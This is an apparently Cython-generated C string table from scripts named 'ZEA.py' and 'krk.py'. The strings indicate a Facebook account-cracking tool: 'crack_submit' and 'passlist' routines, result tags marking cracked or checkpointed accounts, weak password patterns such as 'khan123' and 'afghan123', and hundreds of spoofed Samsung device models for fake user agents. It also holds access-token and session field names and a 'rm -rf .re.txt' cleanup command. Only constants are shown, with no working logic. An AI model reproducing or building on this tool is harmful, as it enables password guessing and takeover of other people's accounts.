static const char __pyx_k_TL_tl[] = " TL-tl; ";
static const char __pyx_k_agent[] = "agent";
static const char __pyx_k_build[] = "build";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_error[] = "error";
static const char __pyx_k_false[] = "false";
static const char __pyx_k_first[] = "first";
static const char __pyx_k_fkeyx[] = "fkeyx";
static const char __pyx_k_flush[] = "flush";
static const char __pyx_k_gmail[] = "gmail";
static const char __pyx_k_group[] = "group";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_light[] = "light";
static const char __pyx_k_limit[] = "limit";
static const char __pyx_k_linex[] = "linex";
static const char __pyx_k_lists[] = "lists";
static const char __pyx_k_login[] = "login";
static const char __pyx_k_lower[] = "lower";
static const char __pyx_k_model[] = "model";
static const char __pyx_k_names[] = "names";
static const char __pyx_k_plist[] = "plist";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_range[] = "range";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_start[] = "start";
static const char __pyx_k_throw[] = "throw";
static const char __pyx_k_total[] = "total";
static const char __pyx_k_uaku2[] = "uaku2";
static const char __pyx_k_uuid4[] = "uuid4";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_Choose[] = " Choose: ";
static const char __pyx_k_GT_810[] = "GT-810";
static const char __pyx_k_GT_93G[] = "GT-93G";
static const char __pyx_k_GT_V8a[] = "GT-V8a";
static const char __pyx_k_GT_V8i[] = "GT-V8i";
static const char __pyx_k_Random[] = "Random";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_append[] = "append";
static const char __pyx_k_base64[] = "base64";
static const char __pyx_k_c_user[] = "c_user";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_device[] = "device";
static const char __pyx_k_digits[] = "digits";
static const char __pyx_k_domain[] = " domain: ";
static const char __pyx_k_enable[] = "enable";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_family[] = "family";
static const char __pyx_k_format[] = "format";
static const char __pyx_k_getlog[] = "getlog";
static const char __pyx_k_idpass[] = "idpass";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_krk_py[] = "krk.py";
static const char __pyx_k_locale[] = "locale";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_public[] = "public";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_re_txt[] = ".re.txt";
static const char __pyx_k_rsplit[] = "rsplit";
static const char __pyx_k_search[] = "search";
static const char __pyx_k_secure[] = "secure";
static const char __pyx_k_sim_id[] = "sim_id";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_stdout[] = "stdout";
static const char __pyx_k_string[] = "string";
static const char __pyx_k_submit[] = "submit";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_url_wa[] = "url_wa";
static const char __pyx_k_urllib[] = "urllib";
static const char __pyx_k_1_37m_2[] = "\033[1;37m";
static const char __pyx_k_Android[] = "Android";
static const char __pyx_k_GT_1015[] = "GT-1015";
static const char __pyx_k_GT_1020[] = "GT-1020";
static const char __pyx_k_GT_1030[] = "GT-1030";
static const char __pyx_k_GT_1035[] = "GT-1035";
static const char __pyx_k_GT_1040[] = "GT-1040";
static const char __pyx_k_GT_1045[] = "GT-1045";
static const char __pyx_k_GT_1050[] = "GT-1050";
static const char __pyx_k_GT_1240[] = "GT-1240";
static const char __pyx_k_GT_1440[] = "GT-1440";
static const char __pyx_k_GT_1450[] = "GT-1450";
static const char __pyx_k_GT_2000[] = "GT-2000";
static const char __pyx_k_GT_200s[] = "GT-200s";
static const char __pyx_k_GT_3000[] = "GT-3000";
static const char __pyx_k_GT_6918[] = "GT-6918";
static const char __pyx_k_GT_7010[] = "GT-7010";
static const char __pyx_k_GT_7020[] = "GT-7020";
static const char __pyx_k_GT_7030[] = "GT-7030";
static const char __pyx_k_GT_7040[] = "GT-7040";
static const char __pyx_k_GT_7050[] = "GT-7050";
static const char __pyx_k_GT_7100[] = "GT-7100";
static const char __pyx_k_GT_7105[] = "GT-7105";
static const char __pyx_k_GT_7110[] = "GT-7110";
static const char __pyx_k_GT_7205[] = "GT-7205";
static const char __pyx_k_GT_7210[] = "GT-7210";
static const char __pyx_k_GT_7245[] = "GT-7245";
static const char __pyx_k_GT_7303[] = "GT-7303";
static const char __pyx_k_GT_7310[] = "GT-7310";
static const char __pyx_k_GT_7320[] = "GT-7320";
static const char __pyx_k_GT_7325[] = "GT-7325";
static const char __pyx_k_GT_7326[] = "GT-7326";
static const char __pyx_k_GT_7340[] = "GT-7340";
static const char __pyx_k_GT_7405[] = "GT-7405";
static const char __pyx_k_GT_8010[] = "GT-8010";
static const char __pyx_k_GT_8105[] = "GT-8105";
static const char __pyx_k_GT_8110[] = "GT-8110";
static const char __pyx_k_GT_8410[] = "GT-8410";
static const char __pyx_k_GT_9300[] = "GT-9300";
static const char __pyx_k_GT_9320[] = "GT-9320";
static const char __pyx_k_GT_I900[] = "GT-I900";
static const char __pyx_k_GT_T140[] = "GT-T140";
static const char __pyx_k_GT_T150[] = "GT-T150";
static const char __pyx_k_GT_W131[] = "GT-W131";
static const char __pyx_k_GT_W153[] = "GT-W153";
static const char __pyx_k_GT_X831[] = "GT-X831";
static const char __pyx_k_GT_X853[] = "GT-X853";
static const char __pyx_k_GT_X870[] = "GT-X870";
static const char __pyx_k_GT_X890[] = "GT-X890";
static const char __pyx_k_GT_m190[] = "GT-m190";
static const char __pyx_k_GT_mini[] = "GT-mini";
static const char __pyx_k_Session[] = "Session";
static const char __pyx_k_choices[] = "choices";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_disable[] = "disable";
static const char __pyx_k_genexpr[] = "genexpr";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_jazoest[] = "jazoest";
static const char __pyx_k_khan123[] = "khan123";
static const char __pyx_k_last123[] = "last123";
static const char __pyx_k_lchoice[] = "lchoice";
static const char __pyx_k_message[] = "message";
static const char __pyx_k_randint[] = "randint";
static const char __pyx_k_replace[] = "replace";
static const char __pyx_k_samsung[] = "samsung";
static const char __pyx_k_session[] = "session";
static const char __pyx_k_tokenku[] = "tokenku";
static const char __pyx_k_try_num[] = "try_num";
static const char __pyx_k_unknown[] = "unknown";
static const char __pyx_k_GT_18190[] = "GT-18190";
static const char __pyx_k_GT_18262[] = "GT-18262";
static const char __pyx_k_GT_19082[] = "GT-19082";
static const char __pyx_k_GT_19083[] = "GT-19083";
static const char __pyx_k_GT_19105[] = "GT-19105";
static const char __pyx_k_GT_19152[] = "GT-19152";
static const char __pyx_k_GT_19192[] = "GT-19192";
static const char __pyx_k_GT_19300[] = "GT-19300";
static const char __pyx_k_GT_19505[] = "GT-19505";
static const char __pyx_k_GT_20000[] = "GT-20000";
static const char __pyx_k_GT_7240R[] = "GT-7240R";
static const char __pyx_k_GT_8220S[] = "GT-8220S";
static const char __pyx_k_GT_A7100[] = "GT-A7100";
static const char __pyx_k_GT_A9500[] = "GT-A9500";
static const char __pyx_k_GT_B2710[] = "GT-B2710";
static const char __pyx_k_GT_B5330[] = "GT-B5330";
static const char __pyx_k_GT_B5510[] = "GT-B5510";
static const char __pyx_k_GT_B5512[] = "GT-B5512";
static const char __pyx_k_GT_B5722[] = "GT-B5722";
static const char __pyx_k_GT_B7510[] = "GT-B7510";
static const char __pyx_k_GT_B7722[] = "GT-B7722";
static const char __pyx_k_GT_B7810[] = "GT-B7810";
static const char __pyx_k_GT_B9150[] = "GT-B9150";
static const char __pyx_k_GT_B9388[] = "GT-B9388";
static const char __pyx_k_GT_C3010[] = "GT-C3010";
static const char __pyx_k_GT_C3262[] = "GT-C3262";
static const char __pyx_k_GT_C3312[] = "GT-C3312";
static const char __pyx_k_GT_C3322[] = "GT-C3322";
static const char __pyx_k_GT_C3520[] = "GT-C3520";
static const char __pyx_k_GT_C3592[] = "GT-C3592";
static const char __pyx_k_GT_C3595[] = "GT-C3595";
static const char __pyx_k_GT_C3782[] = "GT-C3782";
static const char __pyx_k_GT_C6712[] = "GT-C6712";
static const char __pyx_k_GT_E1500[] = "GT-E1500";
static const char __pyx_k_GT_E2200[] = "GT-E2200";
static const char __pyx_k_GT_E2202[] = "GT-E2202";
static const char __pyx_k_GT_E2250[] = "GT-E2250";
static const char __pyx_k_GT_E2252[] = "GT-E2252";
static const char __pyx_k_GT_E2600[] = "GT-E2600";
static const char __pyx_k_GT_E3210[] = "GT-E3210";
static const char __pyx_k_GT_E3309[] = "GT-E3309";
static const char __pyx_k_GT_G530H[] = "GT-G530H";
static const char __pyx_k_GT_G930F[] = "GT-G930F";
static const char __pyx_k_GT_H9500[] = "GT-H9500";
static const char __pyx_k_GT_I5508[] = "GT-I5508";
static const char __pyx_k_GT_I5801[] = "GT-I5801";
static const char __pyx_k_GT_I6410[] = "GT-I6410";
static const char __pyx_k_GT_I8150[] = "GT-I8150";
static const char __pyx_k_GT_I8258[] = "GT-I8258";
static const char __pyx_k_GT_I8268[] = "GT-I8268";
static const char __pyx_k_GT_I8505[] = "GT-I8505";
static const char __pyx_k_GT_I8750[] = "GT-I8750";
static const char __pyx_k_GT_I9250[] = "GT-I9250";
static const char __pyx_k_GT_I9600[] = "GT-I9600";
static const char __pyx_k_GT_M5650[] = "GT-M5650";
static const char __pyx_k_GT_N5100[] = "GT-N5100";
static const char __pyx_k_GT_N5105[] = "GT-N5105";
static const char __pyx_k_GT_N5110[] = "GT-N5110";
static const char __pyx_k_GT_N5120[] = "GT-N5120";
static const char __pyx_k_GT_N7005[] = "GT-N7005";
static const char __pyx_k_GT_N7102[] = "GT-N7102";
static const char __pyx_k_GT_N7105[] = "GT-N7105";
static const char __pyx_k_GT_N7108[] = "GT-N7108";
static const char __pyx_k_GT_N8000[] = "GT-N8000";
static const char __pyx_k_GT_N8005[] = "GT-N8005";
static const char __pyx_k_GT_N8010[] = "GT-N8010";
static const char __pyx_k_GT_N8020[] = "GT-N8020";
static const char __pyx_k_GT_N9000[] = "GT-N9000";
static const char __pyx_k_GT_N9505[] = "GT-N9505";
static const char __pyx_k_GT_P1010[] = "GT-P1010";
static const char __pyx_k_GT_P3105[] = "GT-P3105";
static const char __pyx_k_GT_P3108[] = "GT-P3108";
static const char __pyx_k_GT_P3110[] = "GT-P3110";
static const char __pyx_k_GT_P5100[] = "GT-P5100";
static const char __pyx_k_GT_P5200[] = "GT-P5200";
static const char __pyx_k_GT_P5220[] = "GT-P5220";
static const char __pyx_k_GT_P6200[] = "GT-P6200";
static const char __pyx_k_GT_P6201[] = "GT-P6201";
static const char __pyx_k_GT_P6210[] = "GT-P6210";
static const char __pyx_k_GT_P6211[] = "GT-P6211";
static const char __pyx_k_GT_P6800[] = "GT-P6800";
static const char __pyx_k_GT_P7100[] = "GT-P7100";
static const char __pyx_k_GT_P7300[] = "GT-P7300";
static const char __pyx_k_GT_P7310[] = "GT-P7310";
static const char __pyx_k_GT_P7320[] = "GT-P7320";
static const char __pyx_k_GT_P7501[] = "GT-P7501";
static const char __pyx_k_GT_P7511[] = "GT-P7511";
static const char __pyx_k_GT_S3330[] = "GT-S3330";
static const char __pyx_k_GT_S3332[] = "GT-S3332";
static const char __pyx_k_GT_S3333[] = "GT-S3333";
static const char __pyx_k_GT_S3370[] = "GT-S3370";
static const char __pyx_k_GT_S3518[] = "GT-S3518";
static const char __pyx_k_GT_S3570[] = "GT-S3570";
static const char __pyx_k_GT_S3650[] = "GT-S3650";
static const char __pyx_k_GT_S3802[] = "GT-S3802";
static const char __pyx_k_GT_S3850[] = "GT-S3850";
static const char __pyx_k_GT_S5220[] = "GT-S5220";
static const char __pyx_k_GT_S5222[] = "GT-S5222";
static const char __pyx_k_GT_S5230[] = "GT-S5230";
static const char __pyx_k_GT_S5250[] = "GT-S5250";
static const char __pyx_k_GT_S5253[] = "GT-S5253";
static const char __pyx_k_GT_S5280[] = "GT-S5280";
static const char __pyx_k_GT_S5282[] = "GT-S5282";
static const char __pyx_k_GT_S5292[] = "GT-S5292";
static const char __pyx_k_GT_S5300[] = "GT-S5300";
static const char __pyx_k_GT_S5301[] = "GT-S5301";
static const char __pyx_k_GT_S5302[] = "GT-S5302";
static const char __pyx_k_GT_S5303[] = "GT-S5303";
static const char __pyx_k_GT_S5310[] = "GT-S5310";
static const char __pyx_k_GT_S5312[] = "GT-S5312";
static const char __pyx_k_GT_S5330[] = "GT-S5330";
static const char __pyx_k_GT_S5360[] = "GT-S5360";
static const char __pyx_k_GT_S5363[] = "GT-S5363";
static const char __pyx_k_GT_S5367[] = "GT-S5367";
static const char __pyx_k_GT_S5369[] = "GT-S5369";
static const char __pyx_k_GT_S5380[] = "GT-S5380";
static const char __pyx_k_GT_S5500[] = "GT-S5500";
static const char __pyx_k_GT_S5560[] = "GT-S5560";
static const char __pyx_k_GT_S5578[] = "GT-S5578";
static const char __pyx_k_GT_S5600[] = "GT-S5600";
static const char __pyx_k_GT_S5603[] = "GT-S5603";
static const char __pyx_k_GT_S5610[] = "GT-S5610";
static const char __pyx_k_GT_S5611[] = "GT-S5611";
static const char __pyx_k_GT_S5620[] = "GT-S5620";
static const char __pyx_k_GT_S5670[] = "GT-S5670";
static const char __pyx_k_GT_S5690[] = "GT-S5690";
static const char __pyx_k_GT_S5830[] = "GT-S5830";
static const char __pyx_k_GT_S5838[] = "GT-S5838";
static const char __pyx_k_GT_S6010[] = "GT-S6010";
static const char __pyx_k_GT_S6012[] = "GT-S6012";
static const char __pyx_k_GT_S6102[] = "GT-S6102";
static const char __pyx_k_GT_S6312[] = "GT-S6312";
static const char __pyx_k_GT_S6352[] = "GT-S6352";
static const char __pyx_k_GT_S6500[] = "GT-S6500";
static const char __pyx_k_GT_S6790[] = "GT-S6790";
static const char __pyx_k_GT_S6800[] = "GT-S6800";
static const char __pyx_k_GT_S6802[] = "GT-S6802";
static const char __pyx_k_GT_S6810[] = "GT-S6810";
static const char __pyx_k_GT_S6812[] = "GT-S6812";
static const char __pyx_k_GT_S6818[] = "GT-S6818";
static const char __pyx_k_GT_S7262[] = "GT-S7262";
static const char __pyx_k_GT_S7270[] = "GT-S7270";
static const char __pyx_k_GT_S7272[] = "GT-S7272";
static const char __pyx_k_GT_S7278[] = "GT-S7278";
static const char __pyx_k_GT_S7390[] = "GT-S7390";
static const char __pyx_k_GT_S7392[] = "GT-S7392";
static const char __pyx_k_GT_S7500[] = "GT-S7500";
static const char __pyx_k_GT_S7560[] = "GT-S7560";
static const char __pyx_k_GT_S7562[] = "GT-S7562";
static const char __pyx_k_GT_S7566[] = "GT-S7566";
static const char __pyx_k_GT_S7568[] = "GT-S7568";
static const char __pyx_k_GT_S7572[] = "GT-S7572";
static const char __pyx_k_GT_S758X[] = "GT-S758X";
static const char __pyx_k_GT_S7592[] = "GT-S7592";
static const char __pyx_k_GT_S7710[] = "GT-S7710";
static const char __pyx_k_GT_S7898[] = "GT-S7898";
static const char __pyx_k_GT_S8500[] = "GT-S8500";
static const char __pyx_k_GT_S8530[] = "GT-S8530";
static const char __pyx_k_GT_S8600[] = "GT-S8600";
static const char __pyx_k_GT_VC818[] = "GT-VC818";
static const char __pyx_k_GT_Y8750[] = "GT-Y8750";
static const char __pyx_k_GT_g900f[] = "GT-g900f";
static const char __pyx_k_GT_i8700[] = "GT-i8700";
static const char __pyx_k_GT_i9040[] = "GT-i9040";
static const char __pyx_k_GT_s5260[] = "GT-s5260";
static const char __pyx_k_complete[] = "complete";
static const char __pyx_k_document[] = "document";
static const char __pyx_k_domain_2[] = "domain";
static const char __pyx_k_first123[] = "first123";
static const char __pyx_k_fullagnt[] = "fullagnt";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_khan1122[] = "khan1122";
static const char __pyx_k_khankhan[] = "khankhan";
static const char __pyx_k_last1234[] = "last1234";
static const char __pyx_k_navigate[] = "navigate";
static const char __pyx_k_passlist[] = "passlist";
static const char __pyx_k_password[] = "password";
static const char __pyx_k_ps_limit[] = "ps_limit";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_s_are_on[] = "s are on. ";
static const char __pyx_k_Afghan123[] = "Afghan123";
static const char __pyx_k_GT_19060I[] = "GT-19060I";
static const char __pyx_k_GT_414XOP[] = "GT-414XOP";
static const char __pyx_k_GT_B5330B[] = "GT-B5330B";
static const char __pyx_k_GT_B5330L[] = "GT-B5330L";
static const char __pyx_k_GT_C3310R[] = "GT-C3310R";
static const char __pyx_k_GT_C3312R[] = "GT-C3312R";
static const char __pyx_k_GT_C3313T[] = "GT-C3313T";
static const char __pyx_k_GT_C3322i[] = "GT-C3322i";
static const char __pyx_k_GT_C3520I[] = "GT-C3520I";
static const char __pyx_k_GT_E1282T[] = "GT-E1282T";
static const char __pyx_k_GT_E2652W[] = "GT-E2652W";
static const char __pyx_k_GT_E3309I[] = "GT-E3309I";
static const char __pyx_k_GT_E3309T[] = "GT-E3309T";
static const char __pyx_k_GT_I8262D[] = "GT-I8262D";
static const char __pyx_k_GT_I8550E[] = "GT-I8550E";
static const char __pyx_k_GT_I9008L[] = "GT-I9008L";
static const char __pyx_k_GT_I9080E[] = "GT-I9080E";
static const char __pyx_k_GT_I9082C[] = "GT-I9082C";
static const char __pyx_k_GT_I9082i[] = "GT-I9082i";
static const char __pyx_k_GT_I9100G[] = "GT-I9100G";
static const char __pyx_k_GT_I9100M[] = "GT-I9100M";
static const char __pyx_k_GT_I9100P[] = "GT-I9100P";
static const char __pyx_k_GT_I9100T[] = "GT-I9100T";
static const char __pyx_k_GT_I9128E[] = "GT-I9128E";
static const char __pyx_k_GT_I9128I[] = "GT-I9128I";
static const char __pyx_k_GT_I9128V[] = "GT-I9128V";
static const char __pyx_k_GT_I9158P[] = "GT-I9158P";
static const char __pyx_k_GT_I9158V[] = "GT-I9158V";
static const char __pyx_k_GT_I9168I[] = "GT-I9168I";
static const char __pyx_k_GT_I9192I[] = "GT-I9192I";
static const char __pyx_k_GT_I9195H[] = "GT-I9195H";
static const char __pyx_k_GT_I9195L[] = "GT-I9195L";
static const char __pyx_k_GT_I9303I[] = "GT-I9303I";
static const char __pyx_k_GT_I9305N[] = "GT-I9305N";
static const char __pyx_k_GT_I9308I[] = "GT-I9308I";
static const char __pyx_k_GT_I9505G[] = "GT-I9505G";
static const char __pyx_k_GT_I9505X[] = "GT-I9505X";
static const char __pyx_k_GT_I9507V[] = "GT-I9507V";
static const char __pyx_k_GT_N5000S[] = "GT-N5000S";
static const char __pyx_k_GT_N7000B[] = "GT-N7000B";
static const char __pyx_k_GT_N7100T[] = "GT-N7100T";
static const char __pyx_k_GT_N7105T[] = "GT-N7105T";
static const char __pyx_k_GT_N7108D[] = "GT-N7108D";
static const char __pyx_k_GT_P1000M[] = "GT-P1000M";
static const char __pyx_k_GT_P1000T[] = "GT-P1000T";
static const char __pyx_k_GT_P3100B[] = "GT-P3100B";
static const char __pyx_k_GT_P6200L[] = "GT-P6200L";
static const char __pyx_k_GT_P7300B[] = "GT-P7300B";
static const char __pyx_k_GT_P7500D[] = "GT-P7500D";
static const char __pyx_k_GT_P7500M[] = "GT-P7500M";
static const char __pyx_k_GT_P7500R[] = "GT-P7500R";
static const char __pyx_k_GT_P7500V[] = "GT-P7500V";
static const char __pyx_k_GT_S3600i[] = "GT-S3600i";
static const char __pyx_k_GT_S3653W[] = "GT-S3653W";
static const char __pyx_k_GT_S3770K[] = "GT-S3770K";
static const char __pyx_k_GT_S3770M[] = "GT-S3770M";
static const char __pyx_k_GT_S3800W[] = "GT-S3800W";
static const char __pyx_k_GT_S5220R[] = "GT-S5220R";
static const char __pyx_k_GT_S5230W[] = "GT-S5230W";
static const char __pyx_k_GT_S5233T[] = "GT-S5233T";
static const char __pyx_k_GT_S5283B[] = "GT-S5283B";
static const char __pyx_k_GT_S5300L[] = "GT-S5300L";
static const char __pyx_k_GT_S5301B[] = "GT-S5301B";
static const char __pyx_k_GT_S5301L[] = "GT-S5301L";
static const char __pyx_k_GT_S5302B[] = "GT-S5302B";
static const char __pyx_k_GT_S5303B[] = "GT-S5303B";
static const char __pyx_k_GT_S5310B[] = "GT-S5310B";
static const char __pyx_k_GT_S5310C[] = "GT-S5310C";
static const char __pyx_k_GT_S5310E[] = "GT-S5310E";
static const char __pyx_k_GT_S5310G[] = "GT-S5310G";
static const char __pyx_k_GT_S5310I[] = "GT-S5310I";
static const char __pyx_k_GT_S5310L[] = "GT-S5310L";
static const char __pyx_k_GT_S5310M[] = "GT-S5310M";
static const char __pyx_k_GT_S5310N[] = "GT-S5310N";
static const char __pyx_k_GT_S5312B[] = "GT-S5312B";
static const char __pyx_k_GT_S5312C[] = "GT-S5312C";
static const char __pyx_k_GT_S5312L[] = "GT-S5312L";
static const char __pyx_k_GT_S5360B[] = "GT-S5360B";
static const char __pyx_k_GT_S5360L[] = "GT-S5360L";
static const char __pyx_k_GT_S5360T[] = "GT-S5360T";
static const char __pyx_k_GT_S5380D[] = "GT-S5380D";
static const char __pyx_k_GT_S5560i[] = "GT-S5560i";
static const char __pyx_k_GT_S5570B[] = "GT-S5570B";
static const char __pyx_k_GT_S5570I[] = "GT-S5570I";
static const char __pyx_k_GT_S5570L[] = "GT-S5570L";
static const char __pyx_k_GT_S5610K[] = "GT-S5610K";
static const char __pyx_k_GT_S5670B[] = "GT-S5670B";
static const char __pyx_k_GT_S5690R[] = "GT-S5690R";
static const char __pyx_k_GT_S5830D[] = "GT-S5830D";
static const char __pyx_k_GT_S5830G[] = "GT-S5830G";
static const char __pyx_k_GT_S5830L[] = "GT-S5830L";
static const char __pyx_k_GT_S5830M[] = "GT-S5830M";
static const char __pyx_k_GT_S5830T[] = "GT-S5830T";
static const char __pyx_k_GT_S5830V[] = "GT-S5830V";
static const char __pyx_k_GT_S5830i[] = "GT-S5830i";
static const char __pyx_k_GT_S5831i[] = "GT-S5831i";
static const char __pyx_k_GT_S5839i[] = "GT-S5839i";
static const char __pyx_k_GT_S6012B[] = "GT-S6012B";
static const char __pyx_k_GT_S6102B[] = "GT-S6102B";
static const char __pyx_k_GT_S6293T[] = "GT-S6293T";
static const char __pyx_k_GT_S6310B[] = "GT-S6310B";
static const char __pyx_k_GT_S6313T[] = "GT-S6313T";
static const char __pyx_k_GT_S6500D[] = "GT-S6500D";
static const char __pyx_k_GT_S6500L[] = "GT-S6500L";
static const char __pyx_k_GT_S6790L[] = "GT-S6790L";
static const char __pyx_k_GT_S6790N[] = "GT-S6790N";
static const char __pyx_k_GT_S6792L[] = "GT-S6792L";
static const char __pyx_k_GT_S6810B[] = "GT-S6810B";
static const char __pyx_k_GT_S6810E[] = "GT-S6810E";
static const char __pyx_k_GT_S6810L[] = "GT-S6810L";
static const char __pyx_k_GT_S6810M[] = "GT-S6810M";
static const char __pyx_k_GT_S6810P[] = "GT-S6810P";
static const char __pyx_k_GT_S6812B[] = "GT-S6812B";
static const char __pyx_k_GT_S6812C[] = "GT-S6812C";
static const char __pyx_k_GT_S6812i[] = "GT-S6812i";
static const char __pyx_k_GT_S6818V[] = "GT-S6818V";
static const char __pyx_k_GT_S7230E[] = "GT-S7230E";
static const char __pyx_k_GT_S7233E[] = "GT-S7233E";
static const char __pyx_k_GT_S7250D[] = "GT-S7250D";
static const char __pyx_k_GT_S7270L[] = "GT-S7270L";
static const char __pyx_k_GT_S7272C[] = "GT-S7272C";
static const char __pyx_k_GT_S7273T[] = "GT-S7273T";
static const char __pyx_k_GT_S7278U[] = "GT-S7278U";
static const char __pyx_k_GT_S7390G[] = "GT-S7390G";
static const char __pyx_k_GT_S7390L[] = "GT-S7390L";
static const char __pyx_k_GT_S7392L[] = "GT-S7392L";
static const char __pyx_k_GT_S7500L[] = "GT-S7500L";
static const char __pyx_k_GT_S7500T[] = "GT-S7500T";
static const char __pyx_k_GT_S7560M[] = "GT-S7560M";
static const char __pyx_k_GT_S7562C[] = "GT-S7562C";
static const char __pyx_k_GT_S7562L[] = "GT-S7562L";
static const char __pyx_k_GT_S7562i[] = "GT-S7562i";
static const char __pyx_k_GT_S7568I[] = "GT-S7568I";
static const char __pyx_k_GT_S7580E[] = "GT-S7580E";
static const char __pyx_k_GT_S7583T[] = "GT-S7583T";
static const char __pyx_k_GT_S7710L[] = "GT-S7710L";
static const char __pyx_k_GT_S7898I[] = "GT-S7898I";
static const char __pyx_k_GT_STB919[] = "GT-STB919";
static const char __pyx_k_GT_VM919S[] = "GT-VM919S";
static const char __pyx_k_GT_s5233w[] = "GT-s5233w";
static const char __pyx_k_Put_limit[] = " Put limit: ";
static const char __pyx_k_afghan123[] = "afghan123";
static const char __pyx_k_device_id[] = "device_id";
static const char __pyx_k_error_msg[] = "error_msg";
static const char __pyx_k_firstlast[] = "firstlast";
static const char __pyx_k_hexdigits[] = "hexdigits";
static const char __pyx_k_isenabled[] = "isenabled";
static const char __pyx_k_khan12345[] = "khan12345";
static const char __pyx_k_last12345[] = "last12345";
static const char __pyx_k_last_name[] = "last_name";
static const char __pyx_k_randrange[] = "randrange";
static const char __pyx_k_sec_ch_ua[] = "sec-ch-ua";
static const char __pyx_k_total_ids[] = "total_ids";
static const char __pyx_k_Afghan1234[] = "Afghan1234";
static const char __pyx_k_GT_ANDROID[] = "GT-ANDROID";
static const char __pyx_k_IndexError[] = "IndexError";
static const char __pyx_k_User_Agent[] = "User-Agent";
static const char __pyx_k_ValueError[] = "ValueError";
static const char __pyx_k_afghan1234[] = "afghan1234";
static const char __pyx_k_checkpoint[] = "checkpoint";
static const char __pyx_k_error_data[] = "error_data";
static const char __pyx_k_exceptions[] = "exceptions";
static const char __pyx_k_first12345[] = "first12345";
static const char __pyx_k_first_name[] = "first_name";
static const char __pyx_k_for_log_in[] = " for log in";
static const char __pyx_k_khan123456[] = "khan123456";
static const char __pyx_k_python_ZEA[] = "python ZEA";
static const char __pyx_k_splitlines[] = "splitlines";
static const char __pyx_k_subprocess[] = "subprocess";
static const char __pyx_k_user_agent[] = "user-agent";
static const char __pyx_k_Afghan12345[] = "Afghan12345";
static const char __pyx_k_GT_P5210XD1[] = "GT-P5210XD1";
static const char __pyx_k_accessToken[] = "accessToken";
static const char __pyx_k_afghan12345[] = "afghan12345";
static const char __pyx_k_khankhan123[] = "khankhan123";
static const char __pyx_k_max_workers[] = "max_workers";
static const char __pyx_k_random_seed[] = "random_seed";
static const char __pyx_k_session_key[] = "session_key";
static const char __pyx_k_sim_serials[] = "sim_serials";
static const char __pyx_k_1_32m_ZEA_OK[] = "\r\r\033[1;32m [ZEA-OK] ";
static const char __pyx_k_1_33m_ZEA_2F[] = "\r\r \033[1;33m[ZEA-2F] ";
static const char __pyx_k_1_34m_ZEA_2F[] = "\r\r \033[1;34m[ZEA-2F] ";
static const char __pyx_k_1_36m_ZEA_CP[] = "\r\r\033[1;36m [ZEA-CP] ";
static const char __pyx_k_Content_Type[] = "Content-Type";
static const char __pyx_k_FBOP_19_FBCA[] = ";FBOP/19;FBCA/";
static const char __pyx_k_GT_P5100_JDQ[] = "GT-P5100|JDQ";
static const char __pyx_k_Put_password[] = " Put password ";
static const char __pyx_k_SM_T235_KOT4[] = "SM-T235|KOT4";
static const char __pyx_k_SM_T311_KOT4[] = "SM-T311|KOT4";
static const char __pyx_k_X_FB_Net_HNI[] = "X-FB-Net-HNI";
static const char __pyx_k_X_FB_SIM_HNI[] = "X-FB-SIM-HNI";
static const char __pyx_k_authenticate[] = "authenticate";
static const char __pyx_k_check_output[] = "check_output";
static const char __pyx_k_community_id[] = "community_id";
static const char __pyx_k_crack_submit[] = "crack_submit";
static const char __pyx_k_firstlast123[] = "firstlast123";
static const char __pyx_k_gzip_deflate[] = "gzip, deflate";
static const char __pyx_k_initializing[] = "_initializing";
static const char __pyx_k_is_coroutine[] = "_is_coroutine";
static const char __pyx_k_login_no_pin[] = "login_no_pin";
static const char __pyx_k_rm_rf_re_txt[] = "rm -rf .re.txt";
static const char __pyx_k_shortly_with[] = " shortly with ";
static const char __pyx_k_1_37mYour_Key[] = " \033[1;37mYour Key : ";
static const char __pyx_k_9_FBOP_1_FBCA[] = ";9;FBOP/1;FBCA/";
static const char __pyx_k_Authorization[] = "Authorization";
static const char __pyx_k_Choose_Option[] = " Choose Option : ";
static const char __pyx_k_Expect_an_SMS[] = "Expect an SMS";
static const char __pyx_k_Put_last_name[] = " Put last name: ";
static const char __pyx_k_SM_J320F_LMY4[] = "SM-J320F|LMY4";
static const char __pyx_k_SM_T111_JDQ39[] = "SM-T111|JDQ39";
static const char __pyx_k_SM_T315_JDQ39[] = "SM-T315|JDQ39";
static const char __pyx_k_a_code_to_use[] = "a code to use";
static const char __pyx_k_python_ZEA_py[] = "python ZEA.py";
static const char __pyx_k_1_37m_put_code[] = "\033[1;37m put code: ";
static const char __pyx_k_GT_B5330ZKAINU[] = "GT-B5330ZKAINU";
static const char __pyx_k_GT_I8160OKLTPA[] = "GT-I8160OKLTPA";
static const char __pyx_k_GT_I8160ZWLTTT[] = "GT-I8160ZWLTTT";
static const char __pyx_k_GT_I8530BAABTU[] = "GT-I8530BAABTU";
static const char __pyx_k_GT_I8530BALCHO[] = "GT-I8530BALCHO";
static const char __pyx_k_GT_I8530BALTTT[] = "GT-I8530BALTTT";
static const char __pyx_k_GT_I9082EWAINU[] = "GT-I9082EWAINU";
static const char __pyx_k_GT_I9100LKLCHT[] = "GT-I9100LKLCHT";
static const char __pyx_k_GT_I9105UANDBT[] = "GT-I9105UANDBT";
static const char __pyx_k_GT_I9301I_KOT4[] = "GT-I9301I|KOT4";
static const char __pyx_k_GT_I9500_JDQ39[] = "GT-I9500|JDQ39";
static const char __pyx_k_GT_P1000CWAXSA[] = "GT-P1000CWAXSA";
static const char __pyx_k_GT_P5100_JDQ39[] = "GT-P5100|JDQ39";
